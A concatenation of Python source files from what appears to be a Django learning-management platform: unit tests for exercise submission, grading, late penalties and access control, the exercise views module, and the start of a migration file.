base_exercise_url_params = urllib.parse.parse_qs(split_base_exercise_service_url[1])\n        static_exercise_url_params = urllib.parse.parse_qs(split_static_exercise_service_url[1])\n        self.assertEqual(['100'], base_exercise_url_params['max_points'])\n        self.assertEqual('http://localhost:8001/service', base_exercise_url_params['submission_url'][0][:40])\n        self.assertEqual(['50'], static_exercise_url_params['max_points'])\n        self.assertEqual(['http://localhost:8001/service'], static_exercise_url_params['submission_url'])\n\n    def test_static_exercise_load(self):\n        request = RequestFactory().request(SERVER_NAME='localhost', SERVER_PORT='8001')\n        static_exercise_page = self.static_exercise.load(request, [self.user.userprofile])\n        self.assertIsInstance(static_exercise_page, ExercisePage)\n        self.assertEqual(\"test_page_content\", static_exercise_page.content)\n\n    def test_static_exercise_grade(self):\n        request = RequestFactory().request(SERVER_NAME='localhost', SERVER_PORT='8001')\n        sub = Submission.objects.create_from_post(self.static_exercise, [self.user.userprofile], request)\n        static_exercise_page = self.static_exercise.grade(request, sub)\n        self.assertIsInstance(static_exercise_page, ExercisePage)\n        self.assertTrue(static_exercise_page.is_accepted)\n        self.assertEqual(\"test_submission_content\", static_exercise_page.content)\n\n    def test_exercise_upload_dir(self):\n        from exercise.exercise_models import build_upload_dir\n        self.assertEqual(\"course_instance_1/exercise_attachment_5/test_file_name\",\n                         build_upload_dir(self.exercise_with_attachment, \"test_file_name\"))\n\n    def test_exercise_with_attachment_files_to_submit(self):\n        files = self.exercise_with_attachment.get_files_to_submit()\n        self.assertEqual(3, len(files))\n        self.assertEqual(\"test1.txt\", files[0])\n        self.assertEqual(\"test2.txt\", files[1])\n        self.assertEqual(\"img.png\", files[2])\n\n    def test_exercise_with_attachment_load(self):\n        request = RequestFactory().request(SERVER_NAME='localhost', SERVER_PORT='8001')\n        exercise_with_attachment_page = self.exercise_with_attachment.load(request, [self.user.userprofile])\n        self.assertIsInstance(exercise_with_attachment_page, ExercisePage)\n        c = exercise_with_attachment_page.content\n        self.assertTrue('test_instructions' in c)\n        self.assertTrue('test1.txt' in c and 'test2.txt' in c and \"img.png\" in c)\n\n    def test_submission_files(self):\n        self.assertEqual(0, len(self.submission.files.all()))\n        self.submission.add_files(MultiValueDict({\n            \"key1\": [\"test_file1.txt\", \"test_file2.txt\"],\n            \"key2\": [\"test_image.png\", \"test_audio.wav\", \"test_pdf.pdf\"]\n        }))\n        self.assertEqual(5, len(self.submission.files.all()))\n\n    def test_submission_points(self):\n        try:\n            self.submission.set_points(10, 5)\n            self.fail(\"Should not be able to set points higher than max points!\")\n        except AssertionError:\n            self.submission.set_points(5, 10)\n            self.assertEqual(50, self.submission.grade)\n            self.late_submission_when_late_allowed.set_points(10, 10)\n            self.assertEqual(80, self.late_submission_when_late_allowed.grade)\n\n    def test_submission_late_penalty_applied(self):\n        self.submission.set_points(5, 10)\n        self.late_submission.set_points(5, 10)\n        self.submission_when_late_allowed.set_points(5, 10)\n        self.late_submission_when_late_allowed.set_points(5, 10)\n        self.late_late_submission_when_late_allowed.set_points(5, 10)\n        self.assertFalse(self.submission.late_penalty_applied)\n        self.assertTrue(self.late_submission.late_penalty_applied is not None)\n        self.assertAlmostEqual(self.late_submission.late_penalty_applied, 0.0)\n        self.assertEqual(self.late_submission.service_points, 5)\n        self.assertEqual(self.late_submission.grade, 50)\n        self.assertFalse(self.submission_when_late_allowed.late_penalty_applied)\n        self.assertTrue(self.late_submission_when_late_allowed.late_penalty_applied)\n        self.assertTrue(self.late_late_submission_when_late_allowed.late_penalty_applied)\n        self.assertAlmostEqual(self.late_late_submission_when_late_allowed.late_penalty_applied, 0.2)\n        self.assertEqual(self.late_late_submission_when_late_allowed.service_points, 5)\n        self.assertEqual(self.late_late_submission_when_late_allowed.grade, 40)\n        deviation = DeadlineRuleDeviation.objects.create(\n            exercise=self.base_exercise_with_late_submission_allowed,\n            submitter=self.user.userprofile,\n            extra_minutes=10*24*60,\n            without_late_penalty=True\n        )\n        self.late_late_submission_when_late_allowed.set_points(5, 10)\n        self.assertFalse(self.late_late_submission_when_late_allowed.late_penalty_applied)\n        deviation.without_late_penalty=False\n        deviation.save()\n        self.late_late_submission_when_late_allowed.set_points(5, 10)\n        self.assertAlmostEqual(self.late_late_submission_when_late_allowed.late_penalty_applied, 0.2)\n\n    def test_early_submission(self):\n        self.course_module_with_late_submissions_allowed.opening_time = self.tomorrow\n        submission = Submission.objects.create(\n            exercise=self.base_exercise_with_late_submission_allowed,\n            grader=self.grader.userprofile\n        )\n        submission.submitters.add(self.grader.userprofile)\n        submission.set_points(10, 10)\n        self.assertFalse(submission.late_penalty_applied)\n\n    def test_unofficial_submission(self):\n        self.course_module_with_late_submissions_allowed.late_submissions_allowed = False\n        self.course_module_with_late_submissions_allowed.save()\n        self.learning_object_category.accept_unofficial_submits = True\n        self.learning_object_category.save()\n\n        self.late_submission_when_late_allowed.set_points(10, 10)\n        self.late_submission_when_late_allowed.set_ready()\n        self.late_submission_when_late_allowed.save()\n        self.assertEqual(self.late_submission_when_late_allowed.grade, 100)\n        self.assertEqual(self.late_submission_when_late_allowed.status, Submission.STATUS.UNOFFICIAL)\n        summary = UserExerciseSummary(self.base_exercise_with_late_submission_allowed, self.user)\n        self.assertEqual(summary.get_submission_count(), 3)\n        self.assertEqual(summary.get_points(), 0) # unofficial points are not shown here\n        self.assertFalse(summary.is_graded())\n        self.assertTrue(summary.is_unofficial())\n\n        self.submission_when_late_allowed.set_points(5, 10)\n        self.submission_when_late_allowed.set_ready()\n        self.submission_when_late_allowed.save()\n        self.assertEqual(self.submission_when_late_allowed.grade, 50)\n        self.assertEqual(self.submission_when_late_allowed.status, Submission.STATUS.READY)\n        summary = UserExerciseSummary(self.base_exercise_with_late_submission_allowed, self.user)\n        self.assertEqual(summary.get_points(), 50)\n        self.assertTrue(summary.is_graded())\n        self.assertFalse(summary.is_unofficial())\n\n        sub = Submission.objects.create(\n            exercise=self.base_exercise_with_late_submission_allowed,\n            grader=self.grader.userprofile\n        )\n        sub.submission_time = self.two_days_from_now + timedelta(days = 1)\n        sub.save()\n        sub.submitters.add(self.user.userprofile)\n        sub.set_points(10, 10)\n        sub.save()\n        summary = UserExerciseSummary(self.base_exercise_with_late_submission_allowed, self.user)\n        self.assertEqual(summary.get_points(), 50)\n        self.assertTrue(summary.is_graded())\n        self.assertFalse(summary.is_unofficial())\n\n    def test_unofficial_max_submissions(self):\n        self.learning_object_category.accept_unofficial_submits = True\n        self.learning_object_category.save()\n        res = self.base_exercise.one_has_submissions([self.user.userprofile])\n        self.assertFalse(res[0] and len(res[1]) == 0)\n        self.submission.set_points(1, 10)\n        self.submission.set_ready()\n        self.submission.save()\n        self.assertEqual(self.submission.status, Submission.STATUS.UNOFFICIAL)\n\n    def test_submission_unicode_string(self):\n        self.assertEqual(\"1\", str(self.submission))\n        self.assertEqual(\"2\", str(self.submission_with_two_submitters))\n        self.assertEqual(\"3\", str(self.late_submission))\n        self.assertEqual(\"4\", str(self.submission_when_late_allowed))\n        self.assertEqual(\"5\", str(self.late_submission_when_late_allowed))\n        self.assertEqual(\"6\", str(self.late_late_submission_when_late_allowed))\n\n    def test_submission_status(self):\n        self.assertEqual(\"initialized\", self.submission.status)\n        self.assertFalse(self.submission.is_graded)\n        self.submission.set_error()\n        self.assertEqual(\"error\", self.submission.status)\n        self.assertFalse(self.submission.is_graded)\n        self.submission.set_waiting()\n        self.assertEqual(\"waiting\", self.submission.status)\n        self.assertFalse(self.submission.is_graded)\n        self.submission.set_error()\n        self.assertEqual(\"error\", self.submission.status)\n        self.assertFalse(self.submission.is_graded)\n        self.assertEqual(None, self.submission.grading_time)\n        self.submission.set_ready()\n        self.assertIsInstance(self.submission.grading_time, datetime)\n        self.assertEqual(\"ready\", self.submission.status)\n        self.assertTrue(self.submission.is_graded)\n\n    def test_submission_absolute_url(self):\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/test-module/b1/submissions/1/\", self.submission.get_absolute_url())\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/test-module/b1/submissions/3/\", self.late_submission.get_absolute_url())\n\n    def test_submission_upload_dir(self):\n        from exercise.submission_models import build_upload_dir\n        submitted_file1 = SubmittedFile.objects.create(\n            submission=self.submission,\n            param_name=\"testParam\"\n        )\n\n        submitted_file2 = SubmittedFile.objects.create(\n            submission=self.submission_with_two_submitters,\n            param_name=\"testParam2\"\n        )\n        self.assertEqual(\"course_instance_1/submissions/exercise_3/users_1/submission_1/test_file_name\", build_upload_dir(submitted_file1, \"test_file_name\"))\n        self.assertEqual(\"course_instance_1/submissions/exercise_3/users_1-4/submission_2/test_file_name\", build_upload_dir(submitted_file2, \"test_file_name\"))\n\n    def test_exercise_views(self):\n        upcoming_module = CourseModule.objects.create(\n            name=\"upcoming module\",\n            url=\"upcoming-module\",\n            points_to_pass=15,\n            course_instance=self.course_instance,\n            opening_time=self.two_days_from_now,\n            closing_time=self.three_days_from_now\n        )\n        upcoming_static_exercise = StaticExercise.objects.create(\n            name=\"upcoming exercise\",\n            course_module=upcoming_module,\n            category=self.learning_object_category,\n            url=\"sssss\",\n            max_points=50,\n            points_to_pass=50,\n            service_url=\"/testServiceURL\",\n            exercise_page_content=\"test_page_content\",\n            submission_page_content=\"test_submission_content\"\n        )\n        self.submission_with_two_submitters.submitters.remove(self.user.userprofile)\n        response = self.client.get(self.static_exercise.get_absolute_url())\n        self.assertEqual(response.status_code, 302)\n\n        self.client.login(username=\"testUser\", password=\"testPassword\")\n        response = self.client.get(self.static_exercise.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.context[\"exercise\"], self.static_exercise)\n        response = self.client.get(upcoming_static_exercise.get_absolute_url())\n        self.assertEqual(response.status_code, 403)\n        response = self.client.get(self.submission.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.context[\"submission\"], self.submission)\n        response = self.client.get(self.submission_with_two_submitters.get_absolute_url())\n        self.assertEqual(response.status_code, 403)\n\n        self.client.login(username=\"staff\", password=\"staffPassword\")\n        response = self.client.get(upcoming_static_exercise.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(self.submission.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(self.submission_with_two_submitters.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n\n        self.client.login(username=\"grader\", password=\"graderPassword\")\n        response = self.client.get(upcoming_static_exercise.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(self.submission.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(self.submission_with_two_submitters.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n\n    def test_exercise_staff_views(self):\n        self.other_instance = CourseInstance.objects.create(\n            instance_name=\"Another\",\n            starting_time=self.today,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"another\"\n        )\n        self.other_instance.assistants.add(self.grader.userprofile)\n        list_submissions_url = self.base_exercise.get_submission_list_url()\n        assess_submission_url = self.submission.get_url('submission-assess')\n        response = self.client.get(list_submissions_url)\n        self.assertEqual(response.status_code, 302)\n\n        self.client.login(username=\"testUser\", password=\"testPassword\")\n        response = self.client.get(list_submissions_url)\n        self.assertEqual(response.status_code, 403)\n        response = self.client.get(assess_submission_url)\n        self.assertEqual(response.status_code, 403)\n\n        self.client.login(username=\"staff\", password=\"staffPassword\")\n        response = self.client.get(list_submissions_url)\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(assess_submission_url)\n        self.assertEqual(response.status_code, 200)\n\n        self.client.login(username=\"grader\", password=\"graderPassword\")\n        response = self.client.get(list_submissions_url)\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(assess_submission_url)\n        self.assertEqual(response.status_code, 403)\n\n        self.base_exercise.allow_assistant_grading = True\n        self.base_exercise.save()\n        response = self.client.get(assess_submission_url)\n        self.assertEqual(response.status_code, 200)\n\n        self.course_instance.assistants.clear()\n        response = self.client.get(list_submissions_url)\n        self.assertEqual(response.status_code, 403)\n\n    def test_uploading_and_viewing_file(self):\n        exercise = BaseExercise.objects.create(\n            order=4,\n            name=\"test exercise 4\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url=\"bbb\",\n            max_points=50,\n            points_to_pass=50,\n            max_submissions=0,\n            service_url=\"http://nowhere.asdasfasf/testServiceURL\",\n        )\n        png = b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x05\\x08\\x02\\x00\\x00\\x00\\x02\\r\\xb1\\xb2\\x00\\x00\\x00\\x01sRGB\\x00\\xae\\xce\\x1c\\xe9\\x00\\x00\\x00\\x15IDAT\\x08\\xd7c`\\xc0\\n\\xfe\\xff\\xff\\x8f\\xce\\xc1\"\\x84\\x05\\x00\\x00\\xde\\x7f\\x0b\\xf5<|+\\x98\\x00\\x00\\x00\\x00IEND\\xaeB`\\x82'\n        file_a = os.path.join(settings.MEDIA_ROOT, \"test.png\")\n        file_b = os.path.join(settings.MEDIA_ROOT, \"test.py\")\n        with open(file_a, \"wb\") as f:\n            f.write(png)\n        with open(file_b, \"wb\") as f:\n            f.write(\"Tekij\u00e4t ja Hyypp\u00f6\".encode(\"latin1\"))\n\n        self.course_instance.enroll_student(self.user)\n        self.client.login(username=\"testUser\", password=\"testPassword\")\n\n        with open(file_a, \"rb\") as fa:\n            with open(file_b, \"rb\") as fb:\n                response = self.client.post(exercise.get_absolute_url(), {\n                    \"key\": \"value\",\n                    \"file1\": fa,\n                    \"file2\": fb,\n                })\n        self.assertEqual(response.status_code, 302)\n\n        subs = self.user.userprofile.submissions.filter(exercise=exercise.id)\n        self.assertEqual(subs.count(), 1)\n        sub = subs.first()\n\n        self.assertEqual(sub.submission_data[0], [\"key\", \"value\"])\n        self.assertEqual(sub.files.count(), 2)\n        files = sub.files.all().order_by(\"param_name\")\n\n        self.assertEqual(files[0].param_name, \"file1\")\n        response = self.client.get(files[0].get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response[\"Content-Type\"], \"image/png\")\n\n        self.assertEqual(files[1].param_name, \"file2\")\n        response = self.client.get(files[1].get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response[\"Content-Type\"], 'text/plain; charset=\"UTF-8\"')\n\n        response = self.client.get(files[1].get_absolute_url() + \"?download=1\")\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response[\"Content-Type\"], \"application/octet-stream\")\n        self.assertTrue(response[\"Content-Disposition\"].startswith(\"attachment; filename=\"))\n\n        exercise.delete()\n\n    def test_can_show_model_solutions(self):\n        course_module_with_late_submissions_open = CourseModule.objects.create(\n            name=\"test module late open\",\n            url=\"test-module-late-open\",\n            points_to_pass=50,\n            course_instance=self.course_instance,\n            opening_time=self.yesterday - timedelta(days=1),\n            closing_time=self.yesterday,\n            late_submissions_allowed=True,\n            late_submission_deadline=self.tomorrow,\n            late_submission_penalty=0.4,\n        )\n        course_module_with_late_submissions_closed = CourseModule.objects.create(\n            name=\"test module late closed\",\n            url=\"test-module-late-closed\",\n            points_to_pass=50,\n            course_instance=self.course_instance,\n            opening_time=self.yesterday - timedelta(days=1),\n            closing_time=self.yesterday,\n            late_submissions_allowed=True,\n            late_submission_deadline=self.today - timedelta(hours=1),\n            late_submission_penalty=0.4,\n        )\n        base_exercise_with_late_open = BaseExercise.objects.create(\n            name=\"test exercise late open\",\n            course_module=course_module_with_late_submissions_open,\n            category=self.learning_object_category,\n            url=\"blateopen\",\n            max_submissions=5,\n        )\n        base_exercise_with_late_closed = BaseExercise.objects.create(\n            name=\"test exercise late closed\",\n            course_module=course_module_with_late_submissions_closed,\n            category=self.learning_object_category,\n            url=\"blateclosed\",\n            max_submissions=5,\n        )\n\n        self.assertFalse(self.base_exercise.can_show_model_solutions) # module is open\n        self.assertFalse(self.base_exercise.can_show_model_solutions_to_student(self.user))\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions) # module is closed\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions_to_student(self.user))\n        self.assertFalse(self.base_exercise_with_late_submission_allowed.can_show_model_solutions) # module is open\n        self.assertFalse(self.base_exercise_with_late_submission_allowed.can_show_model_solutions_to_student(self.user))\n        self.assertFalse(base_exercise_with_late_open.can_show_model_solutions)\n        self.assertFalse(base_exercise_with_late_open.can_show_model_solutions_to_student(self.user))\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions)\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user))\n\n        # The user has submitted alone and has no deadline extension.\n        self.assertEqual(self.old_base_exercise.get_submissions_for_student(self.user.userprofile).count(), 0)\n        submission1 = Submission.objects.create(\n            exercise=self.old_base_exercise,\n        )\n        submission1.submitters.add(self.user.userprofile)\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions) # module is closed\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions_to_student(self.user))\n        # Add a deadline extension that is still active.\n        deadline_rule_deviation_old_base_exercise = DeadlineRuleDeviation.objects.create(\n            exercise=self.old_base_exercise,\n            submitter=self.user.userprofile,\n            extra_minutes=1440, # One day\n        )\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions)\n        self.assertFalse(self.old_base_exercise.can_show_model_solutions_to_student(self.user))\n        # Change the deadline extension so that it is not active anymore.\n        self.old_course_module.closing_time = self.today - timedelta(hours=2)\n        self.old_course_module.save()\n        deadline_rule_deviation_old_base_exercise.delete()\n        deadline_rule_deviation_old_base_exercise = DeadlineRuleDeviation.objects.create(\n            exercise=self.old_base_exercise,\n            submitter=self.user.userprofile,\n            extra_minutes=10,\n        )\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions)\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions_to_student(self.user))\n\n        # Group submission\n        submission2 = Submission.objects.create(\n            exercise=base_exercise_with_late_closed,\n        )\n        submission2.submitters.add(self.user.userprofile, self.user2.userprofile)\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions)\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user))\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user2))\n        # Add a deadline extension to one group member. It affects all group members.\n        # Note: deadline deviations are relative to the module closing time, not the late submission deadline.\n        deadline_rule_deviation_ex_late_closed = DeadlineRuleDeviation.objects.create(\n            exercise=base_exercise_with_late_closed,\n            submitter=self.user.userprofile,\n            extra_minutes=60*24*2,\n        )\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions)\n        self.assertFalse(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user))\n        self.assertFalse(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user2))\n        # Change the deadline extension so that it is not active anymore.\n        deadline_rule_deviation_ex_late_closed.delete()\n        deadline_rule_deviation_ex_late_closed = DeadlineRuleDeviation.objects.create(\n            exercise=base_exercise_with_late_closed,\n            submitter=self.user.userprofile,\n            extra_minutes=10,\n        )\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions)\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user))\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user2))\n\n/n/n/nexercise/views.py/n/nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.core.exceptions import MultipleObjectsReturned, PermissionDenied\nfrom django.http.response import Http404, HttpResponse\nfrom django.shortcuts import get_object_or_404\nfrom django.utils.decorators import method_decorator\nfrom django.utils.translation import ugettext_lazy as _\nfrom django.views.decorators.clickjacking import xframe_options_exempt\nfrom django.views.decorators.csrf import csrf_exempt\nfrom django.views.static import serve\n\nfrom authorization.permissions import ACCESS\nfrom course.models import CourseModule\nfrom course.viewbase import CourseInstanceBaseView, EnrollableViewMixin\nfrom lib.remote_page import RemotePageNotFound, request_for_response\nfrom lib.viewbase import BaseRedirectMixin, BaseView\nfrom .models import LearningObject, LearningObjectDisplay\nfrom .protocol.exercise_page import ExercisePage\nfrom .submission_models import SubmittedFile, Submission\nfrom .viewbase import ExerciseBaseView, SubmissionBaseView, SubmissionMixin, ExerciseModelBaseView, ExerciseTemplateBaseView\n\nfrom .exercisecollection_models import ExerciseCollection\nfrom .exercise_summary import UserExerciseSummary\nfrom django.urls import reverse\n\n\nclass TableOfContentsView(CourseInstanceBaseView):\n    template_name = \"exercise/toc.html\"\n\n\nclass ResultsView(TableOfContentsView):\n    template_name = \"exercise/results.html\"\n\n\nclass ExerciseInfoView(ExerciseBaseView):\n    ajax_template_name = \"exercise/_exercise_info.html\"\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        self.get_summary_submissions()\n\n\nclass ExerciseView(BaseRedirectMixin, ExerciseBaseView, EnrollableViewMixin):\n    template_name = \"exercise/exercise.html\"\n    ajax_template_name = \"exercise/exercise_plain.html\"\n    post_url_name = \"exercise\"\n    access_mode = ACCESS.STUDENT\n\n    # Allow form posts without the cross-site-request-forgery key.\n    @method_decorator(csrf_exempt)\n    def dispatch(self, request, *args, **kwargs):\n        return super().dispatch(request, *args, **kwargs)\n\n    def get_access_mode(self):\n        access_mode = super().get_access_mode()\n\n        # Loosen the access mode if exercise is enrollment\n        if (self.exercise.status in (\n                LearningObject.STATUS.ENROLLMENT,\n                LearningObject.STATUS.ENROLLMENT_EXTERNAL,\n              ) and access_mode == ACCESS.STUDENT):\n            access_mode = ACCESS.ENROLL\n\n        return access_mode\n\n    def get(self, request, *args, **kwargs):\n        exercisecollection = None\n        exercisecollection_title = None\n        submission_allowed = False\n        disable_submit = False\n        should_enroll = False\n        issues = []\n        students = [self.profile]\n\n        if self.exercise.is_submittable:\n            SUBMIT_STATUS = self.exercise.SUBMIT_STATUS\n            submission_status, submission_allowed, issues, students = self.submission_check()\n            self.get_summary_submissions()\n            disable_submit = submission_status in [\n                SUBMIT_STATUS.CANNOT_ENROLL,\n                SUBMIT_STATUS.NOT_ENROLLED,\n            ]\n            should_enroll = submission_status == SUBMIT_STATUS.NOT_ENROLLED\n\n        if (self.exercise.status == LearningObject.STATUS.MAINTENANCE\n              or self.module.status == CourseModule.STATUS.MAINTENANCE):\n            if self.is_course_staff:\n                issue = _(\"Exercise is in maintenance and content is hidden \"\n                          \"from students.\")\n                messages.error(request, issue)\n                issues.append(issue)\n            else:\n                page = ExercisePage(self.exercise)\n                page.content = _('Unfortunately this exercise is currently '\n                                 'under maintenance.')\n                return super().get(request, *args, page=page, students=students, **kwargs)\n\n        if hasattr(self.exercise, 'generate_table_of_contents') \\\n              and self.exercise.generate_table_of_contents:\n            self.toc = self.content.children_hierarchy(self.exercise)\n            self.note(\"toc\")\n\n        page = self.exercise.as_leaf_class().load(request, students,\n            url_name=self.post_url_name)\n\n        if self.profile:\n            LearningObjectDisplay.objects.create(learning_object=self.exercise, profile=self.profile)\n\n        if isinstance(self.exercise, ExerciseCollection):\n            exercisecollection, exercisecollection_title = self.__load_exercisecollection(request)\n\n        return super().get(request,\n                           *args,\n                           page=page,\n                           students=students,\n                           submission_allowed=submission_allowed,\n                           disable_submit=disable_submit,\n                           should_enroll=should_enroll,\n                           issues=issues,\n                           exercisecollection=exercisecollection,\n                           exercisecollection_title=exercisecollection_title,\n                           **kwargs)\n\n    def post(self, request, *args, **kwargs):\n        # Stop submit trials for e.g. chapters.\n        # However, allow posts from exercises switched to maintenance status.\n        if not self.exercise.is_submittable:\n            return self.http_method_not_allowed(request, *args, **kwargs)\n\n        new_submission = None\n        page = ExercisePage(self.exercise)\n        submission_status, submission_allowed, issues, students = (\n            self.submission_check(True, request)\n        )\n        if submission_allowed:\n            new_submission = Submission.objects.create_from_post(\n                self.exercise, students, request)\n            if new_submission:\n                page = self.exercise.grade(request, new_submission,\n                    url_name=self.post_url_name)\n\n                # Enroll after succesfull enrollment exercise.\n                if self.exercise.status in (\n                    LearningObject.STATUS.ENROLLMENT,\n                    LearningObject.STATUS.ENROLLMENT_EXTERNAL,\n                ) and new_submission.status == Submission.STATUS.READY:\n                    self.instance.enroll_student(self.request.user)\n\n                # Redirect non AJAX normally to submission page.\n                if not request.is_ajax() and \"__r\" not in request.GET:\n                    return self.redirect(new_submission.get_absolute_url() +\n                        (\"?wait=1\" if page.is_wait else \"\"))\n            else:\n                messages.error(request,\n                    _(\"The submission could not be saved for some reason. \"\n                      \"The submission was not registered.\"))\n\n            # Redirect non AJAX content page request back.\n            if not request.is_ajax() and \"__r\" in request.GET:\n                return self.redirect(request.GET[\"__r\"], backup=self.exercise);\n\n        self.get_summary_submissions()\n        return self.response(page=page, students=students,\n            submission=new_submission)\n\n    def submission_check(self, error=False, request=None):\n        if not self.profile:\n            issue = _(\"You need to sign in and enroll to submit exercises.\")\n            messages.error(self.request, issue)\n            return self.exercise.SUBMIT_STATUS.INVALID, False, [issue], []\n        submission_status, issues, students = (\n            self.exercise.check_submission_allowed(self.profile, request)\n        )\n        if len(issues) > 0:\n            if error:\n                messages.error(self.request, \"\\n\".join(issues))\n            else:\n                messages.warning(self.request, \"\\n\".join(issues))\n        submission_allowed = (\n            submission_status == self.exercise.SUBMIT_STATUS.ALLOWED\n        )\n        return submission_status, submission_allowed, issues, students\n\n\n    def __load_exercisecollection(self, request):\n        user = self.profile.user\n\n        if user.is_authenticated:\n            self.exercise.check_submission(user, no_update=True)\n\n        target_exercises = []\n        for t_exercise in self.exercise.exercises:\n            it = t_exercise.parent\n            ex_url = it.url\n            it = it.parent\n            while it is not None:\n                ex_url = it.url + '/' + ex_url\n                it = it.parent\n\n            ex_name = t_exercise.name\n            for candidate in t_exercise.name.split('|'):\n                if request.LANGUAGE_CODE in candidate:\n                    ex_name = candidate[len('{}:'.format(request.LANGUAGE_CODE)):]\n\n            data = {\"exercise\": t_exercise,\n                    \"url\": reverse(\"exercise\", kwargs={\n                        \"course_slug\": t_exercise.course_module.course_instance.course.url,\n                        \"instance_slug\": t_exercise.course_module.course_instance.url,\n                        \"module_slug\": t_exercise.course_module.url,\n                        \"exercise_path\": ex_url,\n                    }),\n                    \"title\": ex_name,\n                    \"max_points\": t_exercise.max_points,\n                    \"user_points\": UserExerciseSummary(t_exercise, request.user).get_points(),\n                    }\n            target_exercises.append(data)\n\n        title = \"{}: {} - {}\".format(t_exercise.course_module.course_instance.course.name,\n                                     t_exercise.course_module.course_instance.instance_name,\n                                     t_exercise.category.name)\n\n        return target_exercises, title\n\n\nclass ExercisePlainView(ExerciseView):\n    raise_exception=True\n    force_ajax_template=True\n    post_url_name=\"exercise-plain\"\n\n    # Allow form posts without the cross-site-request-forgery key.\n    # Allow iframe in another domain.\n    @method_decorator(csrf_exempt)\n    @method_decorator(xframe_options_exempt)\n    def dispatch(self, request, *args, **kwargs):\n        return super().dispatch(request, *args, **kwargs)\n\n\nclass ExerciseModelView(ExerciseModelBaseView):\n    template_name = \"exercise/model.html\"\n    ajax_template_name = \"exercise/_model_files.html\"\n    access_mode = ACCESS.ENROLLED\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        self.get_summary_submissions()\n        self.models = []\n        for url,name in self.exercise.get_models():\n            try:\n                response = request_for_response(url)\n            except RemotePageNotFound:\n                self.models.append({'name': name})\n            else:\n                self.models.append({\n                    'name': name,\n                    'content': response.text,\n                    'html': 'text/html' in response.headers.get('Content-Type'),\n                })\n        self.note('models')\n\n\nclass ExerciseTemplateView(ExerciseTemplateBaseView):\n    template_name = \"exercise/template.html\"\n    ajax_template_name = \"exercise/_template_files.html\"\n    access_mode = ACCESS.ENROLLED\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        self.get_summary_submissions()\n        self.templates = []\n        for url,name in self.exercise.get_templates():\n            response = request_for_response(url)\n            self.templates.append({\n                'name': name,\n                'content': response.text,\n                'html': 'text/html' in response.headers.get('Content-Type'),\n            })\n        self.note('templates')\n\n\nclass SubmissionView(SubmissionBaseView):\n    template_name = \"exercise/submission.html\"\n    ajax_template_name = \"exercise/submission_plain.html\"\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        self.page = { \"is_wait\": \"wait\" in self.request.GET }\n        self.note(\"page\")\n        #if not self.request.is_ajax():\n        self.get_summary_submissions()\n\n\nclass SubmissionPlainView(SubmissionView):\n    raise_exception=True\n    force_ajax_template=True\n\n    # Allow iframe in another domain.\n    @method_decorator(xframe_options_exempt)\n    def dispatch(self, request, *args, **kwargs):\n        return super().dispatch(request, *args, **kwargs)\n\n\nclass SubmissionPollView(SubmissionMixin, BaseView):\n\n    def get(self, request, *args, **kwargs):\n        return HttpResponse(self.submission.status, content_type=\"text/plain\")\n\n\nclass SubmittedFileView(SubmissionMixin, BaseView):\n    file_kw = \"file_id\"\n    file_name_kw = \"file_name\"\n\n    def get_resource_objects(self):\n        super().get_resource_objects()\n        file_id = self._get_kwarg(self.file_kw)\n        file_name = self._get_kwarg(self.file_name_kw)\n        self.file = get_object_or_404(\n            SubmittedFile,\n            id=file_id,\n            submission=self.submission\n        )\n        if self.file.filename != file_name:\n            raise Http404()\n\n    def get(self, request, *args, **kwargs):\n        with open(self.file.file_object.path, \"rb\") as f:\n            bytedata = f.read()\n\n        # Download the file.\n        if request.GET.get(\"download\", False):\n            response = HttpResponse(bytedata,\n                content_type=\"application/octet-stream\")\n            response[\"Content-Disposition\"] = 'attachment; filename=\"{}\"'\\\n                .format(self.file.filename)\n            return response\n\n        if self.file.is_passed():\n            return HttpResponse(bytedata, content_type=self.file.get_mime())\n\n        return HttpResponse(bytedata.decode('utf-8', 'ignore'),\n            content_type='text/plain; charset=\"UTF-8\"')\n/n/n/nexternal_services/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        